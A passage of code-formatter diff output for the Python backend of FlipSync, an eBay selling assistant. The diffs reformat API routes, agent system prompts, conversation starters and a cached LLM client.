     - Returns pending and optionally completed requests
     - Includes requests where user is approver or requester
     - Provides request status and progress
     - Supports filtering and pagination
     """
     try:
         logger.info(f"Getting approval requests for user {current_user.id}")
-        
+
         # Get user requests
         requests = approval_workflow_service.get_user_requests(
-            user_id=str(current_user.id),
-            include_completed=include_completed
-        )
-        
+            user_id=str(current_user.id), include_completed=include_completed
+        )
+
         # Format requests for response
         formatted_requests = []
         for request in requests:
             formatted_requests.append(request.to_dict())
-        
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "requests": formatted_requests,
                 "total_count": len(formatted_requests),
                 "include_completed": include_completed,
-                "retrieved_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "retrieved_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Error getting approval requests: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to retrieve approval requests: {str(e)}"
+            detail=f"Failed to retrieve approval requests: {str(e)}",
         )
 
 
 @router.get("/approval/{request_id}")
 async def get_approval_request(
-    request_id: str,
-    current_user: User = Depends(AuthService.get_current_user)
+    request_id: str, current_user: User = Depends(AuthService.get_current_user)
 ):
     """
     Get specific approval request details.
-    
+
     This endpoint:
     - Returns detailed request information
     - Includes approval/rejection history
     - Shows current status and progress
     - Validates user access permissions
     """
     try:
         logger.info(f"Getting approval request {request_id} for user {current_user.id}")
-        
+
         # Get request
         request = approval_workflow_service.get_request(request_id)
         if not request:
             raise HTTPException(
                 status_code=status.HTTP_404_NOT_FOUND,
-                detail=f"Approval request not found: {request_id}"
-            )
-        
+                detail=f"Approval request not found: {request_id}",
+            )
+
         # Check user access
         user_id = str(current_user.id)
         if user_id not in request.approvers and user_id != request.requester_id:
             raise HTTPException(
                 status_code=status.HTTP_403_FORBIDDEN,
-                detail="Access denied to this approval request"
-            )
-        
+                detail="Access denied to this approval request",
+            )
+
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "request": request.to_dict(),
-                "retrieved_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "retrieved_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except HTTPException:
         raise
     except Exception as e:
         logger.error(f"Error getting approval request: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to retrieve approval request: {str(e)}"
+            detail=f"Failed to retrieve approval request: {str(e)}",
         )
 
 
 @router.get("/stats")
 async def get_websocket_stats(
-    current_user: User = Depends(AuthService.get_current_user)
+    current_user: User = Depends(AuthService.get_current_user),
 ):
     """
     Get WebSocket and workflow statistics.
-    
+
     This endpoint:
     - Returns WebSocket connection statistics
     - Shows approval workflow metrics
     - Provides performance information
     - Includes real-time status data
@@ -356,11 +382,11 @@
     try:
         # Get WebSocket stats - using basic stats since enhanced manager is disabled
         websocket_stats = {
             "status": "enhanced_manager_disabled",
             "active_connections": 0,
-            "message": "Enhanced WebSocket manager is temporarily disabled"
+            "message": "Enhanced WebSocket manager is temporarily disabled",
         }
 
         # Get workflow stats
         workflow_stats = approval_workflow_service.get_workflow_stats()
 
@@ -368,27 +394,27 @@
             status_code=status.HTTP_200_OK,
             content={
                 "success": True,
                 "websocket": websocket_stats,
                 "workflow": workflow_stats,
-                "retrieved_at": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "retrieved_at": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"Error getting WebSocket stats: {e}")
         raise HTTPException(
             status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
-            detail=f"Failed to retrieve statistics: {str(e)}"
+            detail=f"Failed to retrieve statistics: {str(e)}",
         )
 
 
 @router.post("/health")
 async def websocket_health_check():
     """
     Perform health check on WebSocket services.
-    
+
     This endpoint:
     - Tests WebSocket manager functionality
     - Validates approval workflow service
     - Returns comprehensive health status
     - Available without authentication for monitoring
@@ -397,42 +423,48 @@
         # Test WebSocket manager - using basic check since enhanced manager is disabled
         websocket_healthy = True  # Basic check
         websocket_stats = {
             "status": "enhanced_manager_disabled",
             "active_connections": 0,
-            "fastapi_available": True
+            "fastapi_available": True,
         }
 
         # Test approval workflow service
         workflow_healthy = True  # Basic check
         workflow_stats = approval_workflow_service.get_workflow_stats()
 
-        overall_health = "healthy" if websocket_healthy and workflow_healthy else "degraded"
+        overall_health = (
+            "healthy" if websocket_healthy and workflow_healthy else "degraded"
+        )
 
         return JSONResponse(
             status_code=status.HTTP_200_OK,
             content={
                 "status": overall_health,
                 "websocket_manager": {
                     "status": "disabled" if websocket_healthy else "unhealthy",
                     "active_connections": websocket_stats.get("active_connections", 0),
-                    "fastapi_available": websocket_stats.get("fastapi_available", False)
+                    "fastapi_available": websocket_stats.get(
+                        "fastapi_available", False
+                    ),
                 },
                 "approval_workflow": {
                     "status": "healthy" if workflow_healthy else "unhealthy",
                     "active_requests": workflow_stats.get("active_requests", 0),
-                    "timeout_monitor_running": workflow_stats.get("timeout_monitor_running", False)
+                    "timeout_monitor_running": workflow_stats.get(
+                        "timeout_monitor_running", False
+                    ),
                 },
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-        )
-        
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            },
+        )
+
     except Exception as e:
         logger.error(f"WebSocket health check failed: {e}")
         return JSONResponse(
             status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
             content={
                 "status": "unhealthy",
                 "error": str(e),
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-        )
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            },
+        )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/websocket/enhanced_websocket_routes.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/agents/agent_prompts.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/agents/agent_prompts.py	2025-06-19 04:03:46.690789+00:00
@@ -10,20 +10,20 @@
 from enum import Enum
 
 
 class AgentType(str, Enum):
     """Types of agents available in the system."""
+
     MARKET = "market"
     CONTENT = "content"
     LOGISTICS = "logistics"
     EXECUTIVE = "executive"
     LIAISON = "liaison"
 
 
 # Specialized system prompts for each agent type
 AGENT_SYSTEM_PROMPTS: Dict[AgentType, str] = {
-    
     AgentType.MARKET: """You are FlipSync's Market Intelligence Agent, a specialized eBay marketplace expert.
 
  **Your Expertise:**
 - Pricing strategy optimization and competitive analysis
 - Market trend identification and demand forecasting
@@ -48,11 +48,10 @@
  **Sample Responses:**
 - "Based on current market data, your pricing is 15% below competitors. Consider raising by $12-18 to optimize profit while maintaining competitiveness."
 - "This category shows 23% growth this quarter. I recommend increasing inventory by 40% before the holiday season."
 
 Always end with a specific, actionable recommendation that the seller can implement immediately.""",
-
     AgentType.CONTENT: """You are FlipSync's Content Optimization Agent, an eBay listing and SEO specialist.
 
  **Your Expertise:**
 - eBay listing optimization and conversion improvement
 - SEO keyword research and search visibility enhancement
@@ -77,11 +76,10 @@
  **Sample Responses:**
 - "Your title needs these high-traffic keywords: 'vintage', 'rare', 'collectible'. Try: 'Rare Vintage 1985 Nike Air Jordan 1 - Collector's Dream - Authentic Original Box'"
 - "Add emotional triggers to your description: 'Transform your morning routine' instead of 'Coffee maker with timer feature.'"
 
 Always provide specific, copy-paste ready content improvements that boost search visibility and conversion.""",
-
     AgentType.LOGISTICS: """You are FlipSync's Logistics Optimization Agent, a shipping and fulfillment expert.
 
  **Your Expertise:**
 - Shipping cost optimization and carrier selection
 - Inventory management and stock level optimization
@@ -106,11 +104,10 @@
  **Sample Responses:**
 - "Switch to USPS Priority Mail for items under 2 lbs - you'll save $3.50 per shipment and maintain 2-day delivery."
 - "Your current inventory turnover is 45 days. Reduce stock by 30% on slow movers to free up $2,400 in working capital."
 
 Always provide specific cost savings calculations and implementation timelines for logistics improvements.""",
-
     AgentType.EXECUTIVE: """You are FlipSync's Executive Strategy Agent, a business growth and decision-making specialist.
 
  **Your Expertise:**
 - Strategic business planning and growth strategy development
 - Multi-criteria decision analysis and resource allocation
@@ -135,11 +132,10 @@
  **Sample Responses:**
 - "Based on your growth trajectory, I recommend expanding to 3 new categories over 6 months. This diversifies risk while leveraging your operational strengths."
 - "The data suggests focusing on premium products (20% higher margins) rather than volume plays. This positions you for sustainable growth."
 
 Always provide strategic recommendations with clear reasoning, implementation phases, and success metrics.""",
-
     AgentType.LIAISON: """You are FlipSync Assistant, the friendly and helpful eBay selling companion.
 
  **Your Role:**
 - Provide quick, friendly assistance for general eBay selling questions
 - Route complex queries to specialized agents when needed
@@ -163,11 +159,11 @@
 
  **Sample Responses:**
 - "Great question! For detailed pricing analysis, I'd recommend chatting with our Market Agent - they can provide specific competitive insights for your category."
 - "That's a common challenge! Here's a quick tip: adding 'fast shipping' to your titles can boost visibility by 15-20%."
 
-Always be encouraging and helpful, routing complex questions to specialist agents when appropriate."""
+Always be encouraging and helpful, routing complex questions to specialist agents when appropriate.""",
 }
 
 
 def get_agent_system_prompt(agent_type: AgentType) -> str:
     """Get the system prompt for a specific agent type."""
@@ -189,45 +185,43 @@
     AgentType.MARKET: [
         "What should I price this item at?",
         "How do my prices compare to competitors?",
         "What's trending in my category?",
         "Should I raise or lower my prices?",
-        "What's the best time to list this item?"
-    ],
-    
+        "What's the best time to list this item?",
+    ],
     AgentType.CONTENT: [
         "Help me optimize this listing title",
         "Write a better product description",
         "What keywords should I use?",
         "How can I improve my conversion rate?",
-        "Make my listing more appealing"
-    ],
-    
+        "Make my listing more appealing",
+    ],
     AgentType.LOGISTICS: [
         "How can I reduce shipping costs?",
         "What's the best shipping method?",
         "Help me manage my inventory",
         "How much should I charge for shipping?",
-        "Optimize my fulfillment process"
-    ],
-    
+        "Optimize my fulfillment process",
+    ],
     AgentType.EXECUTIVE: [
         "What's my best growth strategy?",
         "Should I expand to new categories?",
         "Help me make this business decision",
         "What are my biggest opportunities?",
-        "Plan my business roadmap"
-    ],
-    
+        "Plan my business roadmap",
+    ],
     AgentType.LIAISON: [
         "I'm new to eBay selling, where do I start?",
         "What's the most important thing to focus on?",
         "Give me a quick tip to improve sales",
         "I need general eBay selling advice",
-        "Help me understand eBay better"
-    ]
+        "Help me understand eBay better",
+    ],
 }
 
 
 def get_conversation_starters(agent_type: AgentType) -> list:
     """Get conversation starters for a specific agent type."""
-    return AGENT_CONVERSATION_STARTERS.get(agent_type, AGENT_CONVERSATION_STARTERS[AgentType.LIAISON])
+    return AGENT_CONVERSATION_STARTERS.get(
+        agent_type, AGENT_CONVERSATION_STARTERS[AgentType.LIAISON]
+    )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/agents/agent_prompts.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/ai/conversation_starters.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/ai/conversation_starters.py	2025-06-19 04:03:47.064099+00:00
@@ -10,10 +10,11 @@
 from enum import Enum
 
 
 class ConversationCategory(str, Enum):
     """Categories of conversation starters."""
+
     PRICING = "pricing"
     LISTINGS = "listings"
     SHIPPING = "shipping"
     INVENTORY = "inventory"
     MARKETING = "marketing"
@@ -21,138 +22,143 @@
     GENERAL = "general"
 
 
 class FlipSyncConversationStarters:
     """Manages FlipSync-specific conversation starters and prompts."""
-    
+
     def __init__(self):
         """Initialize conversation starters."""
         self.starters = self._initialize_starters()
-    
+
     def _initialize_starters(self) -> Dict[ConversationCategory, List[str]]:
         """Initialize conversation starters by category."""
         return {
             ConversationCategory.PRICING: [
                 "How can I optimize my pricing to sell electronics faster on eBay?",
                 "What pricing strategy gets the best ROI for my product category?",
                 "Should I use Best Offer or fixed pricing for faster sales?",
                 "How do I price competitively while maintaining good profit margins?",
-                "What's the optimal price range for my slow-moving inventory?"
+                "What's the optimal price range for my slow-moving inventory?",
             ],
-            
             ConversationCategory.LISTINGS: [
                 "How can I improve my eBay listings to get more views and sales?",
                 "What keywords should I use in my titles for better search visibility?",
                 "How do I optimize my item specifics for eBay's search algorithm?",
                 "What listing format converts best: auction or Buy It Now?",
-                "How can I improve my listing photos to increase conversion rates?"
+                "How can I improve my listing photos to increase conversion rates?",
             ],
-            
             ConversationCategory.SHIPPING: [
                 "How can I optimize shipping costs to improve my profit margins?",
                 "What's the best shipping strategy for my product size and weight?",
                 "Should I offer free shipping or charge separately for better sales?",
                 "How do I calculate shipping costs to stay competitive?",
-                "What shipping services give the best balance of cost and speed?"
+                "What shipping services give the best balance of cost and speed?",
             ],
-            
             ConversationCategory.INVENTORY: [
                 "Which products should I focus on for the highest profit potential?",
                 "How do I identify trending products before they become saturated?",
                 "What's the optimal inventory level for my sales velocity?",
                 "How can I predict demand for seasonal products?",
-                "Which slow-moving items should I liquidate vs. optimize?"
+                "Which slow-moving items should I liquidate vs. optimize?",
             ],
-            
             ConversationCategory.MARKETING: [
                 "When should I boost my listings with eBay Promoted Listings?",
                 "What's the ROI on eBay advertising for my product categories?",
                 "How do I optimize my promoted listings budget for maximum return?",
                 "Should I run sales or promotions to increase velocity?",
-                "What marketing strategies work best for my business size?"
+                "What marketing strategies work best for my business size?",
             ],
-            
             ConversationCategory.ANALYTICS: [
                 "What metrics should I track to measure my eBay business performance?",
                 "How do I analyze my sales data to identify optimization opportunities?",
                 "What's my current sales velocity compared to category averages?",
                 "How can I improve my sell-through rate?",
-                "What are my most profitable product categories and why?"
+                "What are my most profitable product categories and why?",
             ],
-            
             ConversationCategory.GENERAL: [
                 "How can FlipSync help me sell faster and earn more on eBay?",
                 "What's the biggest opportunity to improve my eBay business right now?",
                 "How do I get started with automated listing optimization?",
                 "What FlipSync features will have the most impact on my profits?",
-                "How can I scale my eBay business more efficiently?"
-            ]
+                "How can I scale my eBay business more efficiently?",
+            ],
         }
-    
+
     def get_starters_by_category(self, category: ConversationCategory) -> List[str]:
         """Get conversation starters for a specific category."""
         return self.starters.get(category, [])
-    
+
     def get_all_starters(self) -> List[str]:
         """Get all conversation starters as a flat list."""
         all_starters = []
         for starters in self.starters.values():
             all_starters.extend(starters)
         return all_starters
-    
+
     def get_random_starters(self, count: int = 3) -> List[str]:
         """Get random conversation starters for display."""
         import random
+
         all_starters = self.get_all_starters()
         return random.sample(all_starters, min(count, len(all_starters)))
-    
+
     def get_contextual_starters(self, user_context: Dict[str, Any]) -> List[str]:
         """Get conversation starters based on user context."""
         # Analyze user context to suggest relevant starters
         suggested_starters = []
-        
+
         # Check user's business focus
         business_type = user_context.get("business_type", "").lower()
         recent_activity = user_context.get("recent_activity", "").lower()
-        
+
         # Prioritize based on context
         if "pricing" in recent_activity or "price" in business_type:
-            suggested_starters.extend(self.get_starters_by_category(ConversationCategory.PRICING)[:2])
-        
+            suggested_starters.extend(
+                self.get_starters_by_category(ConversationCategory.PRICING)[:2]
+            )
+
         if "listing" in recent_activity or "optimization" in recent_activity:
-            suggested_starters.extend(self.get_starters_by_category(ConversationCategory.LISTINGS)[:2])
-        
+            suggested_starters.extend(
+                self.get_starters_by_category(ConversationCategory.LISTINGS)[:2]
+            )
+
         if "shipping" in recent_activity or "fulfillment" in recent_activity:
-            suggested_starters.extend(self.get_starters_by_category(ConversationCategory.SHIPPING)[:1])
-        
+            suggested_starters.extend(
+                self.get_starters_by_category(ConversationCategory.SHIPPING)[:1]
+            )
+
         # Always include general starters
-        suggested_starters.extend(self.get_starters_by_category(ConversationCategory.GENERAL)[:1])
-        
+        suggested_starters.extend(
+            self.get_starters_by_category(ConversationCategory.GENERAL)[:1]
+        )
+
         # If no context matches, return general starters
         if not suggested_starters:
-            suggested_starters = self.get_starters_by_category(ConversationCategory.GENERAL)[:3]
-        
+            suggested_starters = self.get_starters_by_category(
+                ConversationCategory.GENERAL
+            )[:3]
+
         return suggested_starters[:5]  # Limit to 5 suggestions
-    
+
     def get_onboarding_starters(self) -> List[str]:
         """Get conversation starters for new users during onboarding."""
         return [
             "How can FlipSync help me sell faster and earn more on eBay?",
             "What's the first optimization I should make to my eBay listings?",
             "How do I get started with automated pricing optimization?",
             "What FlipSync features will have the biggest impact on my profits?",
-            "How can I analyze my current eBay performance to identify opportunities?"
+            "How can I analyze my current eBay performance to identify opportunities?",
         ]
-    
+
     def get_dashboard_starters(self) -> List[str]:
         """Get conversation starters for the main dashboard."""
         return [
             "How can I sell electronics faster on eBay?",
             "What pricing strategy gets the best ROI?",
             "When should I boost my listings with ads?",
             "How can I optimize shipping costs for better margins?",
-            "What listing improvements will increase my sales velocity?"
+            "What listing improvements will increase my sales velocity?",
         ]
 
 
 # Global instance
 conversation_starters = FlipSyncConversationStarters()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/ai/conversation_starters.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/ai/cached_llm_client.py	2025-06-16 16:59:30.306382+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/ai/cached_llm_client.py	2025-06-19 04:03:47.101197+00:00
@@ -20,87 +20,89 @@
 logger = logging.getLogger(__name__)
 
 
 class CachedLLMClient:
     """LLM client with Redis-based response caching."""
-    
-    def __init__(self, llm_client: SimpleLLMClient, cache_service: Optional[AICacheService] = None):
+
+    def __init__(
+        self,
+        llm_client: SimpleLLMClient,
+        cache_service: Optional[AICacheService] = None,
+    ):
         """Initialize cached LLM client."""
         self.llm_client = llm_client
         self.cache_service = cache_service
         self.cache_enabled = cache_service is not None
-        
+
         # Cache configuration
         self.cache_config = {
             "default_ttl": 3600,  # 1 hour
-            "short_ttl": 300,     # 5 minutes for dynamic content
-            "long_ttl": 86400,    # 24 hours for stable content
-            "key_prefix": "flipsync:llm:"
+            "short_ttl": 300,  # 5 minutes for dynamic content
+            "long_ttl": 86400,  # 24 hours for stable content
+            "key_prefix": "flipsync:llm:",
         }
-        
+
         logger.info(f"Initialized CachedLLMClient (cache_enabled={self.cache_enabled})")
-    
+
     async def generate_response(
         self,
         prompt: str,
         system_prompt: Optional[str] = None,
         cache_ttl: Optional[int] = None,
         cache_key_suffix: Optional[str] = None,
-        **kwargs
+        **kwargs,
     ) -> LLMResponse:
         """Generate response with caching support."""
         start_time = time.time()
-        
+
         # Generate cache key
         cache_key = self._generate_cache_key(prompt, system_prompt, cache_key_suffix)
-        
+
         # Try to get from cache first
         if self.cache_enabled:
             cached_response = await self._get_cached_response(cache_key)
             if cached_response:
                 logger.info(f"Cache hit for key: {cache_key[:50]}...")
                 return cached_response
-        
+
         # Generate new response
         try:
             response = await self.llm_client.generate_response(
-                prompt=prompt,
-                system_prompt=system_prompt,
-                **kwargs
+                prompt=prompt, system_prompt=system_prompt, **kwargs
             )
-            
+
             # Cache the response
             if self.cache_enabled:
                 await self._cache_response(cache_key, response, cache_ttl)
-            
+
             return response
-            
+
         except Exception as e:
             logger.error(f"Error generating LLM response: {e}")
             # Try to return stale cache if available
             if self.cache_enabled:
                 stale_response = await self._get_stale_cached_response(cache_key)
                 if stale_response:
                     logger.warning(f"Returning stale cached response due to error: {e}")
                     return stale_response
             raise
-    
+
     def _generate_cache_key(
         self,
         prompt: str,
         system_prompt: Optional[str] = None,
-        suffix: Optional[str] = None
+        suffix: Optional[str] = None,
     ) -> str:
         """Generate cache key for the request."""
         # Create hash of prompt and system prompt
         content = f"{prompt}|{system_prompt or ''}|{self.llm_client.model}"
         if suffix:
             content += f"|{suffix}"
-        
+
         content_hash = hashlib.sha256(content.encode()).hexdigest()[:16]
         return f"{self.cache_config['key_prefix']}{content_hash}"
-    
+
     async def _get_cached_response(self, cache_key: str) -> Optional[LLMResponse]:
         """Get cached response if available."""
         try:
             cached_data = await self.cache_service.get_cached_result(cache_key)
             if cached_data:
@@ -111,92 +113,85 @@
                     model=cached_data["model"],
                     response_time=cached_data["response_time"],
                     metadata={
                         **cached_data.get("metadata", {}),
                         "cached": True,
-                        "cache_hit_time": datetime.now(timezone.utc).isoformat()
+                        "cache_hit_time": datetime.now(timezone.utc).isoformat(),
                     },
-                    tokens_used=cached_data.get("tokens_used", 0)
+                    tokens_used=cached_data.get("tokens_used", 0),
                 )
         except Exception as e:
             logger.warning(f"Error retrieving cached response: {e}")
         return None
-    
+
     async def _get_stale_cached_response(self, cache_key: str) -> Optional[LLMResponse]:
         """Get stale cached response as fallback."""
         # This would require implementing stale cache retrieval in AICacheService
         # For now, return None
         return None
-    
+
     async def _cache_response(
-        self,
-        cache_key: str,
-        response: LLMResponse,
-        ttl: Optional[int] = None
+        self, cache_key: str, response: LLMResponse, ttl: Optional[int] = None
     ) -> None:
         """Cache the LLM response."""
         try:
             cache_data = {
                 "content": response.content,
                 "model": response.model,
                 "response_time": response.response_time,
                 "metadata": response.metadata,
                 "tokens_used": response.tokens_used,
-                "cached_at": datetime.now(timezone.utc).isoformat()
+                "cached_at": datetime.now(timezone.utc).isoformat(),
             }
-            
+
             cache_ttl = ttl or self.cache_config["default_ttl"]
-            await self.cache_service.cache_result(
-                cache_key,
-                cache_data,
-                ttl=cache_ttl
-            )
-            
+            await self.cache_service.cache_result(cache_key, cache_data, ttl=cache_ttl)
+
             logger.debug(f"Cached response with key: {cache_key[:50]}...")
-            
+
         except Exception as e:
             logger.warning(f"Error caching response: {e}")
 
 
 class CachedLLMClientFactory:
     """Factory for creating cached LLM clients."""
-    
+
     @staticmethod
     async def create_cached_client(
         llm_client: SimpleLLMClient,
         redis_url: str = "redis://flipsync-infrastructure-redis:6379",
-        cache_db: int = 2
+        cache_db: int = 2,
     ) -> CachedLLMClient:
         """Create a cached LLM client with Redis cache."""
         try:
             # Initialize cache service
             cache_service = AICacheService(redis_url=redis_url, db=cache_db)
             await cache_service.connect()
-            
+
             return CachedLLMClient(llm_client, cache_service)
-            
+
         except Exception as e:
             logger.warning(f"Failed to initialize cache service: {e}")
             logger.warning("Creating non-cached LLM client")
             return CachedLLMClient(llm_client, None)
-    
+
     @staticmethod
     def create_non_cached_client(llm_client: SimpleLLMClient) -> CachedLLMClient:
         """Create a non-cached LLM client (cache disabled)."""
         return CachedLLMClient(llm_client, None)
 
 
 # Convenience functions for common use cases
 async def create_fast_cached_client() -> CachedLLMClient:
     """Create a fast cached client for simple queries."""
     from fs_agt_clean.core.ai.llm_adapter import FlipSyncLLMFactory
-    
+
     fast_client = FlipSyncLLMFactory.create_fast_client()
     return await CachedLLMClientFactory.create_cached_client(fast_client.client)
 
 
 async def create_smart_cached_client() -> CachedLLMClient:
     """Create a smart cached client for complex queries."""
     from fs_agt_clean.core.ai.llm_adapter import FlipSyncLLMFactory
-    
+
     smart_client = FlipSyncLLMFactory.create_smart_client()
     return await CachedLLMClientFactory.create_cached_client(smart_client.client)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/ai/cached_llm_client.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/analysis/__init__.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/analysis/__init__.py	2025-06-19 04:03:47.188773+00:00
@@ -20,11 +20,11 @@
     TrendDirection,
 )
 
 __all__ = [
     "MarketAnalyzer",
-    "CompetitorMonitor", 
+    "CompetitorMonitor",
     "DemandForecaster",
     "TrendAnalyzer",
     "CompetitorData",
     "CompetitorRank",
     "DemandForecast",
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/analysis/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/monitoring.py	2025-06-14 20:35:30.771697+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/monitoring.py	2025-06-19 04:03:47.330505+00:00
@@ -9,10 +9,11 @@
 from fastapi import APIRouter, Depends, HTTPException, Request
 from fastapi.security import OAuth2PasswordRequestForm
 
 from fs_agt_clean.core.monitoring.types import HealthStatus
 from fs_agt_clean.core.security.auth import get_current_user, require_permissions
+
 # get_request import removed - not used
 from fs_agt_clean.core.models.user import User
 from fs_agt_clean.services.monitoring.enhanced_dashboard import enhanced_dashboard
 
 logger = logging.getLogger(__name__)
@@ -40,27 +41,28 @@
                 "status": "/api/v1/monitoring/status",
                 "health": "/api/v1/monitoring/health/detailed",
                 "ebay_tokens": "/api/v1/monitoring/token-status/ebay",
                 "enhanced_dashboard": "/api/v1/monitoring/dashboard/enhanced",
                 "performance_report": "/api/v1/monitoring/dashboard/performance",
-                "ai_validation": "/api/v1/monitoring/dashboard/ai-validation"
+                "ai_validation": "/api/v1/monitoring/dashboard/ai-validation",
             },
             "capabilities": [
                 "System metrics collection",
                 "Application health monitoring",
                 "Database status tracking",
                 "Token expiration monitoring",
-                "Real-time status updates"
-            ]
+                "Real-time status updates",
+            ],
         }
     except Exception as e:
         logger.error(f"Error getting monitoring overview: {e}")
         return {
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "error": str(e),
-            "status": "error"
-        }
+            "status": "error",
+        }
+
 
 @router.get("/metrics", tags=["monitoring"])
 async def get_system_metrics(
     request: Request,
     user: User = Depends(require_permissions(["admin", "monitoring"])),
@@ -868,43 +870,43 @@
                 "websocket_latency": f"{performance_metrics.websocket_latency*1000:.1f}ms",
                 "database_query_time": f"{performance_metrics.database_query_time*1000:.1f}ms",
                 "memory_usage": f"{performance_metrics.memory_usage:.1f}MB",
                 "cpu_usage": f"{performance_metrics.cpu_usage:.1f}%",
                 "active_connections": performance_metrics.active_connections,
-                "success_rate": f"{performance_metrics.success_rate*100:.1f}%"
+                "success_rate": f"{performance_metrics.success_rate*100:.1f}%",
             },
             "ai_validation_metrics": {
                 "total_validations": ai_validation.total_validations,
                 "consensus_matches": ai_validation.consensus_matches,
                 "average_accuracy": f"{ai_validation.average_accuracy*100:.1f}%",
                 "confidence_improvements": ai_validation.confidence_improvements,
-                "validation_success_rate": f"{ai_validation.validation_success_rate*100:.1f}%"
+                "validation_success_rate": f"{ai_validation.validation_success_rate*100:.1f}%",
             },
             "system_health": {
                 "overall_status": system_health.overall_status,
                 "api_status": system_health.api_status,
                 "database_status": system_health.database_status,
                 "ai_services_status": system_health.ai_services_status,
                 "cache_status": system_health.cache_status,
                 "websocket_status": system_health.websocket_status,
-                "uptime": f"{system_health.uptime/3600:.1f} hours"
+                "uptime": f"{system_health.uptime/3600:.1f} hours",
             },
             "performance_thresholds": {
                 "api_response_time": "100ms",
                 "ai_analysis_time": "5s",
                 "websocket_latency": "100ms",
                 "database_query_time": "50ms",
-                "success_rate": "95%"
-            }
+                "success_rate": "95%",
+            },
         }
 
     except Exception as e:
         logger.error(f"Error getting enhanced dashboard: {e}")
         return {
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "error": str(e),
-            "status": "error"
+            "status": "error",
         }
 
 
 @router.get("/dashboard/performance", tags=["monitoring", "dashboard"])
 async def get_performance_report(
@@ -923,19 +925,19 @@
     try:
         report = await enhanced_dashboard.generate_performance_report(time_range)
         return {
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "status": "operational",
-            **report
+            **report,
         }
 
     except Exception as e:
         logger.error(f"Error generating performance report: {e}")
         return {
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "error": str(e),
-            "status": "error"
+            "status": "error",
         }
 
 
 @router.get("/dashboard/ai-validation", tags=["monitoring", "dashboard"])
 async def get_ai_validation_metrics(
@@ -957,27 +959,32 @@
                 "total_validations": ai_metrics.total_validations,
                 "consensus_matches": ai_metrics.consensus_matches,
                 "average_accuracy": ai_metrics.average_accuracy,
                 "confidence_improvements": ai_metrics.confidence_improvements,
                 "average_confidence_boost": ai_metrics.average_confidence_boost,
-                "validation_success_rate": ai_metrics.validation_success_rate
+                "validation_success_rate": ai_metrics.validation_success_rate,
             },
             "accuracy_targets": {
                 "minimum_accuracy": "75%",
                 "target_accuracy": "85%",
                 "consensus_threshold": "70%",
-                "confidence_improvement_target": "5%"
+                "confidence_improvement_target": "5%",
             },
             "performance_status": {
                 "accuracy_meets_target": ai_metrics.average_accuracy >= 0.75,
                 "consensus_rate_good": ai_metrics.validation_success_rate >= 0.70,
-                "overall_status": "good" if ai_metrics.average_accuracy >= 0.75 and ai_metrics.validation_success_rate >= 0.70 else "needs_improvement"
-            }
+                "overall_status": (
+                    "good"
+                    if ai_metrics.average_accuracy >= 0.75
+                    and ai_metrics.validation_success_rate >= 0.70
+                    else "needs_improvement"
+                ),
+            },
         }
 
     except Exception as e:
         logger.error(f"Error getting AI validation metrics: {e}")
         return {
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "error": str(e),
-            "status": "error"
-        }
+            "status": "error",
+        }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/monitoring.py
--- /home/brend/Flipsync_Final/fs_agt_clean/api/routes/agents.py	2025-06-16 18:39:43.264855+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/api/routes/agents.py	2025-06-19 04:03:47.349220+00:00
@@ -28,10 +28,11 @@
 )
 from pydantic import BaseModel, Field, ConfigDict
 
 from fs_agt_clean.agents.base.decision_engine import Decision
 from fs_agt_clean.database.models.market import MarketplaceType
+
 # from fs_agt_clean.core.monitoring.health import HealthMonitor  # Not yet migrated
 from fs_agt_clean.core.monitoring.types import (
     AgentHealth,
     HealthSnapshot,
     HealthStatus as MonitoringHealthStatus,
@@ -46,40 +47,47 @@
 logger = logging.getLogger(__name__)
 
 # Define router with prefix and tags
 router = APIRouter(tags=["agents"])
 
+
 # OPTIONS handlers for CORS preflight requests
 @router.options("/")
 async def options_agents_root():
     """Handle CORS preflight for agents root endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/list")
 async def options_agents_list():
     """Handle CORS preflight for agents list endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/status")
 async def options_agents_status():
     """Handle CORS preflight for agents status endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/{agent_id}")
